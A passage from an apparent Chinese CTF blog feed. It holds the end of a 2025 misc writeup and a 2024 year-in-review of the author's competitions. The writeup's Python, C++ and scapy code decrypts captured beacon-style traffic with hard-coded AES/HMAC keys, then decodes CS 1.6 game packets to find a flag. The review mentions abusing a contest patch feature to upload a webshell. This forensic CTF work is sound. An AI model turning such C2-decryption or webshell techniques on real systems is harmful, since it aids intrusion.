class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import hmac</span><br><span class="line">import binascii</span><br><span class="line">import base64</span><br><span class="line">import hexdump</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">AES_KEY = binascii.unhexlify(&quot;9fe14473479a283821241e2af78017e8&quot;)</span><br><span class="line">HMAC_KEY = binascii.unhexlify(&quot;1e3d54f1b9f0e106773a59b7c379a89d&quot;)</span><br><span class="line">encrypt_data = &quot;hex&quot; #把上面图中的Data部分复制过来</span><br><span class="line">def decrypt(encrypted_data, iv_bytes, signature, AES_KEY, hmac_key):</span><br><span class="line">    cipher = AES.new(AES_KEY, AES.MODE_CBC, iv_bytes)</span><br><span class="line">    return cipher.decrypt(encrypted_data)</span><br><span class="line">encrypt_data = bytes.fromhex(encrypt_data)</span><br><span class="line">try:</span><br><span class="line">    encrypt_data_length = int.from_bytes(encrypt_data[:4], byteorder=&#x27;big&#x27;, signed=False)</span><br><span class="line">    encrypt_data_l = encrypt_data[4:]</span><br><span class="line">    data1 = encrypt_data_l[:encrypt_data_length-16]</span><br><span class="line">    signature = encrypt_data_l[encrypt_data_length-16:encrypt_data_length]</span><br><span class="line">    iv_bytes = b&quot;abcdefghijklmnop&quot;</span><br><span class="line">    dec = decrypt(data1, iv_bytes, signature, AES_KEY, HMAC_KEY)</span><br><span class="line">except:</span><br><span class="line">    dec = decrypt(encrypt_data, iv_bytes, signature, AES_KEY, HMAC_KEY)</span><br><span class="line">print(&quot;counter: &#123;&#125;&quot;.format(int.from_bytes(dec[:4], byteorder=&#x27;big&#x27;, signed=False)))</span><br><span class="line">print(&quot;任务返回长度: &#123;&#125;&quot;.format(int.from_bytes(dec[4:8], byteorder=&#x27;big&#x27;, signed=False)))</span><br><span class="line">print(&quot;任务输出类型: &#123;&#125;&quot;.format(int.from_bytes(dec[8:12], byteorder=&#x27;big&#x27;, signed=False)))</span><br><span class="line">print(hexdump.hexdump(dec[:1000]))</span><br><span class="line">open(&#x27;secret.pcapng&#x27;,&#x27;wb&#x27;).write(dec[64:-76])</span><br></pre></td></tr></table></figure><p>打开流量包，发现里面全都是27015端口在通讯，查询可知这是游戏cs1.6的流量包</p><p><img src="/images/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025-Misc-Writeup-%E5%A4%8D%E7%8E%B0/image-20250128165953359.png" alt="image-20250128165953359"></p><p>接下来根据<a href="https://www.anquanke.com/post/id/261339">这篇文章</a>来解密</p><p>将下面这个cpp文件编译成so文件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> _LongSwap(<span class="type">int</span> l)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> res = __builtin_bswap32(*(<span class="type">unsigned</span> <span class="type">int</span> *)&amp;l);</span><br><span class="line">        <span class="keyword">return</span> *(<span class="type">int</span> *)&amp;(res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> mungify_table[] =</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="number">0x7A</span>, <span class="number">0x64</span>, <span class="number">0x05</span>, <span class="number">0xF1</span>,</span><br><span class="line">            <span class="number">0x1B</span>, <span class="number">0x9B</span>, <span class="number">0xA0</span>, <span class="number">0xB5</span>,</span><br><span class="line">            <span class="number">0xCA</span>, <span class="number">0xED</span>, <span class="number">0x61</span>, <span class="number">0x0D</span>,</span><br><span class="line">            <span class="number">0x4A</span>, <span class="number">0xDF</span>, <span class="number">0x8E</span>, <span class="number">0xC7</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> mungify_table2[] =</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="number">0x05</span>, <span class="number">0x61</span>, <span class="number">0x7A</span>, <span class="number">0xED</span>,</span><br><span class="line">            <span class="number">0x1B</span>, <span class="number">0xCA</span>, <span class="number">0x0D</span>, <span class="number">0x9B</span>,</span><br><span class="line">            <span class="number">0x4A</span>, <span class="number">0xF1</span>, <span class="number">0x64</span>, <span class="number">0xC7</span>,</span><br><span class="line">            <span class="number">0xB5</span>, <span class="number">0x8E</span>, <span class="number">0xDF</span>, <span class="number">0xA0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> mungify_table3[] =</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="number">0x20</span>, <span class="number">0x07</span>, <span class="number">0x13</span>, <span class="number">0x61</span>,</span><br><span class="line">            <span class="number">0x03</span>, <span class="number">0x45</span>, <span class="number">0x17</span>, <span class="number">0x72</span>,</span><br><span class="line">            <span class="number">0x0A</span>, <span class="number">0x2D</span>, <span class="number">0x48</span>, <span class="number">0x0C</span>,</span><br><span class="line">            <span class="number">0x4A</span>, <span class="number">0x12</span>, <span class="number">0xA9</span>, <span class="number">0xB5</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">COM_UnMunge2</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *data, <span class="type">int</span> len, <span class="type">int</span> seq)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="type">int</span> mungelen;</span><br><span class="line">        <span class="type">int</span> c;</span><br><span class="line">        <span class="type">int</span> *pc;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> *p;</span><br><span class="line">        <span class="type">int</span> j;</span><br><span class="line"></span><br><span class="line">        mungelen = len &amp; ~<span class="number">3</span>;</span><br><span class="line">        mungelen /= <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; mungelen; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            pc = (<span class="type">int</span> *)&amp;data[i * <span class="number">4</span>];</span><br><span class="line">            c = *pc;</span><br><span class="line">            c ^= seq;</span><br><span class="line"></span><br><span class="line">            p = (<span class="type">unsigned</span> <span class="type">char</span> *)&amp;c;</span><br><span class="line">            <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                *p++ ^= (<span class="number">0xa5</span> | (j &lt;&lt; j) | j | mungify_table2[(i + j) &amp; <span class="number">0x0f</span>]);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            c = _LongSwap(c);</span><br><span class="line">            c ^= ~seq;</span><br><span class="line">            *pc = c;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g++ -fPIC -shared -o dll.so 1.cpp</span><br></pre></td></tr></table></figure><p>然后用下面的程序加载编译出的dll.so解密流量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">lib=CDLL(<span class="string">&#x27;./dll.so&#x27;</span>)</span><br><span class="line">COM_UnMunge=lib.COM_UnMunge2</span><br><span class="line"></span><br><span class="line">pcaps = rdpcap(<span class="string">&quot;secret.pcapng&quot;</span>)</span><br><span class="line"></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;res&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> mpacket <span class="keyword">in</span> pcaps.<span class="built_in">filter</span>(<span class="keyword">lambda</span> x:UDP <span class="keyword">in</span> x <span class="keyword">and</span> x[UDP].sport==<span class="number">27015</span>):</span><br><span class="line">    <span class="comment"># mpacket.show()</span></span><br><span class="line">    udp=mpacket[UDP]</span><br><span class="line">    data=<span class="built_in">bytes</span>(udp.payload)[<span class="number">8</span>:]</span><br><span class="line">    seq=<span class="built_in">bytes</span>(udp.payload)[:<span class="number">4</span>]</span><br><span class="line">    ack=<span class="built_in">bytes</span>(udp.payload)[<span class="number">4</span>:<span class="number">8</span>]</span><br><span class="line">    c=create_string_buffer(data)</span><br><span class="line">    COM_UnMunge(c,<span class="built_in">len</span>(data),seq[<span class="number">0</span>])</span><br><span class="line">    <span class="built_in">print</span>(mpacket.time,mpacket[IP].src,<span class="string">&#x27;-&gt;&#x27;</span>,mpacket[IP].dst)</span><br><span class="line">    decode_bytes=<span class="built_in">bytes</span>(c)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(decode_bytes)&gt;<span class="number">10</span>:</span><br><span class="line">        <span class="keyword">if</span> struct.unpack(<span class="string">&#x27;&lt;L&#x27;</span>, seq)[<span class="number">0</span>] &amp; (<span class="number">1</span>&lt;&lt;<span class="number">30</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(decode_bytes)&gt;<span class="number">10</span>+struct.unpack(<span class="string">&#x27;&lt;h&#x27;</span>, decode_bytes[<span class="number">7</span>:<span class="number">9</span>])[<span class="number">0</span>]+<span class="number">1</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;find extra data block:&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(decode_bytes[<span class="number">10</span>+struct.unpack(<span class="string">&#x27;&lt;h&#x27;</span>, decode_bytes[<span class="number">7</span>:<span class="number">9</span>])[<span class="number">0</span>]:])</span><br><span class="line">            decode_bytes=decode_bytes[<span class="number">10</span>:<span class="number">10</span>+struct.unpack(<span class="string">&#x27;&lt;h&#x27;</span>, decode_bytes[<span class="number">7</span>:<span class="number">9</span>])[<span class="number">0</span>]]</span><br><span class="line">        f.write(decode_bytes)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;finally decode data:<span class="subst">&#123;decode_bytes&#125;</span>\nlength:<span class="subst">&#123;<span class="built_in">len</span>(decode_bytes)&#125;</span>&#x27;</span>)        </span><br><span class="line">f.close</span><br></pre></td></tr></table></figure><p>在得到的res文件中搜索不难找到flag</p><p><img src="/images/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025-Misc-Writeup-%E5%A4%8D%E7%8E%B0/image-20250128172100493.png" alt="image-20250128172100493"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> 西湖论剑 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024年度总结</title>
      <link href="/2025/01/21/2024%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
      <url>/2025/01/21/2024%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h2><p>打CTF也有一年了，写个年度报告吧。</p><p>总的来说，这是忙忙碌碌而又颗粒无收的一年，大比赛的奖是一个都没拿到<del>（菜的一批）</del>o(╥﹏╥)o</p><p>不过通过这些比赛也是学到了很多东西，毕竟我也可以算是在网安方面刚刚起步，知识就是这样一点点累积起来的 :)</p><p>再者就是在今年我加入了校队和星盟安全团队，认识了很多大佬，也在联队的培训和茶话会中见识到了很多于我而言的新的东西，了解到了很多前所未闻的技术。从这一点来看，我今年还是win了的 :)</p><p>下面就按月份列一下我一年的历程吧。</p><h2 id="1月"><a href="#1月" class="headerlink" title="1月"></a>1月</h2><p>这时我才刚起步CTF不久，只打过学校的0xGame和NCTF，基本上还在靶场刷题阶段。</p><p>搭建起了我的博客<a href="https://www.blog.st4rr.top/">https://www.blog.st4rr.top/</a></p><h2 id="2月"><a href="#2月" class="headerlink" title="2月"></a>2月</h2><h3 id="BeginCTF"><a href="#BeginCTF" class="headerlink" title="BeginCTF"></a>BeginCTF</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/02/06/BeginCTF2024-Writeup/">点我</a></p><p>这个比赛好像是我自己一个人打着练手的，是个新生赛来着，拿了个第11名。这个比赛没有奖品，唯一记得的是这是我第一次见到tupper自指公式。</p><img src="/images/2024年度总结/IMG_5408.JPG" alt="IMG_5408" style="zoom:50%;" /><h3 id="HGame"><a href="#HGame" class="headerlink" title="HGame"></a>HGame</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/02/06/HGame2024-Writeup/">点我</a></p><p>一年一度的杭电新生赛，也是南邮校科协寒假大作战安全组指定比赛。记得当时我Misc打得还不错，基本ak了，现在想来这也可能影响到了我后来选择misc方向，成为了一名 <del>musc</del> misc手。</p><h3 id="SICTF"><a href="#SICTF" class="headerlink" title="SICTF"></a>SICTF</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/02/19/SICTF2024-Writeup/">点我</a></p><p>找了个朋友f4k3r一起打的，拿了第45名，拿到了我CTF史中的第一个奖品，一台服务器1个月的使用权。</p><p>这个比赛也是我第一次接触区块链的题目，区块链的题目在网上的wp非常的少，而当时区块链的那些名词对我来说也是完全新的事物，所以当时即使是在学长zysgmzb的超级耐心的指导下我也仍然没做出来:( </p><p>当然赛后我专门写了一篇博客好好做了复现：<a href="https://www.blog.st4rr.top/2024/02/22/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%B8%8A%E9%93%BE/">点我</a></p><p>这个时候我绝对不会想到就在八个月后的0xGame中我成了区块链的出题人</p><img src="/images/2024年度总结/IMG_5409.JPG" alt="IMG_5409" style="zoom:50%;" /><h2 id="3月"><a href="#3月" class="headerlink" title="3月"></a>3月</h2><h3 id="qsnCTF"><a href="#qsnCTF" class="headerlink" title="qsnCTF"></a>qsnCTF</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/03/01/qsnCTF2024%20Round1-Writeup/">点我</a></p><p>仍然是跟f4k3r一起打的，由于只有两个人发力，只拿了个优胜奖。加入战队的需要显得越发迫切。</p><img src="/images/2024年度总结/image-20250122113232477.png" alt="image-20250122113232477" style="zoom:50%;" /><h3 id="HSCCTF"><a href="#HSCCTF" class="headerlink" title="HSCCTF"></a>HSCCTF</h3><p>这个比赛打的人很少，给我混了个第十三名。</p><p><img src="/images/2024%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/IMG_5410.JPG" alt="IMG_5410"></p><h3 id="NKCTF"><a href="#NKCTF" class="headerlink" title="NKCTF"></a>NKCTF</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/03/24/NKCTF2024-Writeup/">点我</a></p><p>记得在这场比赛中被打爆了，但是这应该是我打的第一场misc里有MC题的比赛</p><h2 id="4月"><a href="#4月" class="headerlink" title="4月"></a>4月</h2><h3 id="加入X1cT34m"><a href="#加入X1cT34m" class="headerlink" title="加入X1cT34m"></a>加入X1cT34m</h3><p>校队的misc招新，两道题，四个flag，边做边学，最终也是全做出来了，遂成功加入校队。</p><p>刚刚接触网安的时候就听说了小绿草的名声，我甚至可以说是就是为此来南邮学的信安，如今终于成功加入了。前辈们确实全都很强，都是各自方向的顶尖人才，往年也是把各大比赛的国一拿了个遍Orz Orz Orz</p><p>但是到我们这届没落了( 我们这届无pwn，web手由于还打算法所以经常会没空，密码手在十一月才加入战斗，一个re和两个misc<del>，这玩毛线</del></p><p>希望下一届能Make X1cT34m Great Again吧 :(</p><h3 id="XYCTF"><a href="#XYCTF" class="headerlink" title="XYCTF"></a>XYCTF</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/04/29/2024-04-29-XYCTF2024-Writeup/">点我</a></p><p>也是和f4k3r一起打的，记得好像由于持续时间太长，到后面摆了()</p><h2 id="5月"><a href="#5月" class="headerlink" title="5月"></a>5月</h2><h3 id="CISCN初赛"><a href="#CISCN初赛" class="headerlink" title="CISCN初赛"></a>CISCN初赛</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/05/19/CISCN2024-Writeup/">点我</a></p><p>当时我们届已经加入校队的四个(wuming, 1n1t, w8nn9z, St4rr)一起组了个X2cT34m打的，学长们是X1cT34m。我们队由于没有crypto，我在打misc的同时还顺带负责看了一眼crypto。学长们毫无悬念的晋级了，我们是压线晋级的。</p><p><img src="/images/2024%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/image-20250122135739611.png" alt="image-20250122135739611"></p><h3 id="京麒CTF初赛"><a href="#京麒CTF初赛" class="headerlink" title="京麒CTF初赛"></a>京麒CTF初赛</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/05/26/jqctf2024%E5%88%9D%E8%B5%9B-Misc/">点我</a></p><p>这次真就纯靠学长们发力了，直接给干到了第一名Orz 我贡献了一个misc</p><img src="/images/2024年度总结/IMG_5411(20250122-140341).PNG" alt="IMG_5411(20250122-140341)" style="zoom: 25%;" /><h2 id="6月"><a href="#6月" class="headerlink" title="6月"></a>6月</h2><h3 id="LitCTF"><a href="#LitCTF" class="headerlink" title="LitCTF"></a>LitCTF</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/06/01/LitCTF2024-Writeup/">点我</a></p><p>一个人打的，打爽了，但没有奖品</p><h3 id="CISCN华东北赛区赛"><a href="#CISCN华东北赛区赛" class="headerlink" title="CISCN华东北赛区赛"></a>CISCN华东北赛区赛</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/05/19/CISCN2024-Writeup/">点我</a></p><p>第一次打线下赛，还是awdp模式。由于我们队都是菜狗，面对题目一脸懵逼，所以只拿了个三等奖，然后遗憾退场。学长们一如既往地强，他们的队伍进了决赛，然后最终拿到了国一Orz</p><p>后来听学长说，赛区赛他做的系统其实有问题，可以直接通过patch传个马上去然后再攻击就行了。好吧其实我在比赛时也想到了这个方法，跟我们队的web手说了这个想法后他尝试了一下告诉我没成功，然后我也就没去试，想着主办方应该不会犯这么低级的错误。。。所以也就没去试。。。:(</p><p><img src="/images/2024%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/21797C860C0B27C72092B0E2E891CBD6.png" alt="21797C860C0B27C72092B0E2E891CBD6"></p><p><img src="/images/2024%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/4B6473F4627BEF60D6943B46E51C06ED.png" alt="4B6473F4627BEF60D6943B46E51C06ED"></p><p><img src="/images/2024%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/8FFCC683F28A481BE7BE693351986628.png"></p><h2 id="7月"><a href="#7月" class="headerlink" title="7月"></a>7月</h2><p>一直只是在练习CTF，没打比赛</p><h2 id="8月"><a href="#8月" class="headerlink" title="8月"></a>8月</h2><h3 id="加入星盟预备队Hyperion"><a href="#加入星盟预备队Hyperion" class="headerlink" title="加入星盟预备队Hyperion"></a>加入星盟预备队Hyperion</h3><p>由于我们这届校队的配置要打比赛实在是绠短汲深，因此我决定去加入联队。星盟看起来挺强的，各大比赛也算是榜上有名，另外根据其招新标准我掂量着自己应该能达到，于是我试着向星盟投了简历。</p><p>misc方向当时总共给了两道招新题，我在一天内就都做出来了，也顺利通过了面试，遂成功进入了星盟的预备队。</p><img src="/images/2024年度总结/DEF5B71D48D6FAE5FAB1B0CF9193604D.png" alt="DEF5B71D48D6FAE5FAB1B0CF9193604D" style="zoom: 25%;" /><h3 id="京麒CTF决赛"><a href="#京麒CTF决赛" class="headerlink" title="京麒CTF决赛"></a>京麒CTF决赛</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/08/08/jqctf2024%E5%86%B3%E8%B5%9B-Misc-kerberoasting%E5%A4%8D%E7%8E%B0/">点我</a></p><p>和几位学长一起去北京京东总部参加了京麒CTF的决赛。</p><p>misc一共两题，ai的那个学长做出来了，另一个kerberoasting的流量分析我对着看了一天愣是没做出来，遂成功爆零o(╥﹏╥)o</p><p>这道题总共是有三个小问，要求提交的是三个小问的答案拼在一起的结果。结果赛后复现时我发现，原来我一开始的答案就有两个小问是对的，然而由于我不知道到底有几个小问错，所以一直在那不停地改，然后越改越离谱。。。</p><p>最终排名过低，只拿了个优胜奖 :(</p><p>不过也是有机会见识到了京东总部，这一趟来的还是挺值的</p><img src="/images/2024年度总结/IMG_3622.JPG" alt="IMG_3622"  /><p><img src="/images/2024%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/IMG_3630.JPG" alt="IMG_3630"></p><p><img src="/images/2024%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/2A38D14BF8619B1DE00BA5FDD42E1077.png" alt="2A38D14BF8619B1DE00BA5FDD42E1077"></p><p><img src="/images/2024%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/IMG_3634.JPG" alt="IMG_3634"></p><img src="/images/2024年度总结/36279bb0462f43e45d0cb63c90079c54.JPG" alt="36279bb0462f43e45d0cb63c90079c54" style="zoom: 25%;" /><h3 id="MoeCTF"><a href="#MoeCTF" class="headerlink" title="MoeCTF"></a>MoeCTF</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/08/16/MoeCTF2024-Writeup/">点我</a></p><p>一个新生赛，就看了第一周，题挺不错的</p><h3 id="巅峰极客初赛"><a href="#巅峰极客初赛" class="headerlink" title="巅峰极客初赛"></a>巅峰极客初赛</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/08/19/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024%E5%88%9D%E8%B5%9B-Misc-%E7%AE%80%E5%8E%86%E5%A4%8D%E7%8E%B0/">点我</a></p><p>跟校队打的，抽象比赛，一开赛发现全是web，其他方向都只有一题，然而我们的web手缺席。。。未晋级</p><p>唯一的一道misc，都已经做到最后一步了，结果卡住了。。。这是我第一次做到病毒分析题，也是学到了。</p><p><img src="/images/2024%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024.jpeg" alt="img"></p><h3 id="NepCTF"><a href="#NepCTF" class="headerlink" title="NepCTF"></a>NepCTF</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/08/26/NepCTF2024-Writeup/">点我</a></p><p>nepnep办的个人赛，不会别的所以只做了misc，第一次学到了区块链的重入攻击。</p><p>最终拿了个方向优胜奖。</p><p><img src="/images/2024%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/image-20250122181252381.png" alt="image-20250122181252381"></p><h3 id="羊城杯初赛"><a href="#羊城杯初赛" class="headerlink" title="羊城杯初赛"></a>羊城杯初赛</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-Writeup/">点我</a></p><p>跟校队打的，记得misc有很多脑洞题，根本想不到<del>（好吧就是我太菜了）</del>。显然未晋级</p><h2 id="9月"><a href="#9月" class="headerlink" title="9月"></a>9月</h2><h3 id="长城杯初赛"><a href="#长城杯初赛" class="headerlink" title="长城杯初赛"></a>长城杯初赛</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/09/08/%E9%95%BF%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-misc-Writeup/">点我</a></p><p>跟校队打的，两个misc手+一个re手组队。。。不用说了</p><p>记得这个比赛的misc挺简单的，很轻松就ak了。其他方向想做但是一点不懂。。。是时候该学点其他方向了</p><h3 id="ByteCTF初赛"><a href="#ByteCTF初赛" class="headerlink" title="ByteCTF初赛"></a>ByteCTF初赛</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/09/22/ByteCTF2024%E5%88%9D%E8%B5%9B-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/">点我</a></p><p>这次比赛有学长参加，所以成功晋级了()</p><p>但是我misc又爆零了。。。但是通过复现又学到了不少东西</p><p><img src="/images/2024%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/130E289D33E160CB0F1D095AB2928855.png" alt="130E289D33E160CB0F1D095AB2928855"></p><h3 id="WMCTF"><a href="#WMCTF" class="headerlink" title="WMCTF"></a>WMCTF</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/09/24/WMCTF2024-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/">点我</a></p><p>从这开始比赛基本都是跟星盟预备队打的了</p><p>但是这个比赛我又爆零了。。。光是zysgmzb学长出的两道题就够顶了Orz 好好复现了一下，知识++</p><p>未得奖:(</p><h3 id="SCTF"><a href="#SCTF" class="headerlink" title="SCTF"></a>SCTF</h3><p>跟星盟预备队打的，贡献了一道misc :)</p><p>还有一个misc看了半天没做出来，好好复现了一下。</p><p>这个比赛中还有两个crypto，我都是做了一半没做出来，幸亏队里的密码手给力做出来了<del>，我终于不用在打misc的时候再去顾着其他方向了</del>:)</p><p>赛后复现发现原来是我不会二元coppersmith:(</p><h2 id="10月"><a href="#10月" class="headerlink" title="10月"></a>10月</h2><h3 id="御宛杯"><a href="#御宛杯" class="headerlink" title="御宛杯"></a>御宛杯</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/10/15/%E5%BE%A1%E5%AE%9B%E6%9D%AF2024-Writeup/">点我</a></p><p>一个个人赛，打爽了，至少取证做爽了()</p><p>拿了个二等奖<del>（这奖状一定是来搞笑的）</del></p><img src="/images/2024年度总结/季博杯.png" alt="季博杯" style="zoom:50%;" /><h3 id="办赛0xGame"><a href="#办赛0xGame" class="headerlink" title="办赛0xGame"></a>办赛0xGame</h3><p>misc官方wp: <a href="https://www.blog.st4rr.top/2024/11/11/0xGame2024-Misc-Official-Writeup/">点我</a></p><p>去年还在坐牢，今年也是当起出题人了()</p><p>今年0xGame2024的misc方向（包括osint, blockchain, forensics）是我和w8nn9z一起出的，出题好难，比做题还难:(</p><p>第一次出题，出的不好还请师傅们多多包涵() 毕竟往年的题都是zysgmzb学长出的，这题目质量相较往年肯定一下子就下来了:(</p><p>这一届小登有几个还是挺强的，比我去年同期强多了，邮专校队又有希望了:)</p><h3 id="强网拟态初赛"><a href="#强网拟态初赛" class="headerlink" title="强网拟态初赛"></a>强网拟态初赛</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/10/21/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-%E5%88%9D%E8%B5%9BMisc-Writeup-%E5%A4%8D%E7%8E%B0/">点我</a></p><p>跟校队打的，贡献了一道crypto，两道misc:)</p><p>还有两道misc有点脑洞，实在想不到<del>（是我太菜了）</del></p><p>未晋级:(</p><h3 id="ByteCTF决赛"><a href="#ByteCTF决赛" class="headerlink" title="ByteCTF决赛"></a>ByteCTF决赛</h3><p>全靠学长，纯去北京玩了一趟()</p><img src="/images/2024年度总结/94850E62CF9F2AC2207DFD07D86C849D.png" alt="94850E62CF9F2AC2207DFD07D86C849D" style="zoom: 25%;" /><h3 id="BuildCTF"><a href="#BuildCTF" class="headerlink" title="BuildCTF"></a>BuildCTF</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/10/29/BuildCTF2024-Writeup/">点我</a></p><p>就花了一晚上看一看<del>，妄想着冲冲分</del></p><h2 id="11月"><a href="#11月" class="headerlink" title="11月"></a>11月</h2><h3 id="强网杯初赛"><a href="#强网杯初赛" class="headerlink" 